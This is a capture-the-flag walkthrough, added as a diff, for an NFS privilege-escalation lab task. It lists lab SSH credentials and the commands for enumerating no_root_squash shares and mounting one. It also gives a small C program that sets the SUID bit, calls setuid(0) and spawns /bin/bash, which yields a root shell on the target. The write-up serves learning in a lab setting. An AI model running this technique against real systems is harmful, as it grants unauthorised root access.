@@ -1,0 +1,67 @@
+TASK_11
+Linux Privilege Escalation > Task 11 "NFS"
+
+______ssh creds______
+|Username: karen    |
+|Password: Password1|
+---------------------
+
+
+NFS (Network File System) is a protocol used in Linux and other Unix-like operating systems that allows users to access files and directories over a network as if they were on a local disk.
+Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present. NFS Configuration File is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users. NFS Configuration File is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+
+!DISCLAIMER!
+Consider using the AttackBox instead of VPN
+
+First of all lets enumerate the mountable shares of the target
+input   :   showmount -e <TARGET_IP>
+outpt   :   Export list for <TARGET_IP>:
+            /home/ubuntu/sharedfolder *
+            /tmp                      *
+            /home/backup              *
+So we have 3 mountable shares (answer to the first question)
+
+Then we have to identify the mountable shares that "no_root_squash" option is enabled.
+By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+input   :   cat /etc/exports
+outpt   :   ...
+            /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+            /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+            /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+So we have also 3 mountable shares that "no_root_squash" option is enabled
+
+Now we will mount the "/tmp" folder of the target to ours. Consider creating a subfolder inside "/tmp" into MACHINA in order to not blend with the content of your system
+input   :   sudo mount -o rw <TARGET_IP>:<PATH_TO_NFS> <PATH_TO_MACHINA_NFS_FOLDER>
+outpt   :   //Blank. Hit "ls -la" to verify it
+
+Then create the exploit
+input   :   nano <FILE>.c
+###
+int main () {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+###
+outpt   :   //Blank. Hit "ls -la" or "cat <FILE>.c" to verify it
+
+Compile it
+input   :   gcc <FILE>.c -o <COMPILED_FILE> -w
+outpt   :   //Blank
+
+Then give it the right permissions
+input   :   chmod +xs <COMPILED_FILE>
+outpt   :   //Blank. Hit "ls -la" to verify it
+
+And from the target run the compiled file
+input   :   ./<COMPILED_FILE>
+outpt   :   //Root Shell Opens
+
+Find the Flag!
+input   :   cat <PATH_TO_FLAG>
+outpt   :   <FLAG>
+
+
+
+made by @gr1m.r3ap3r
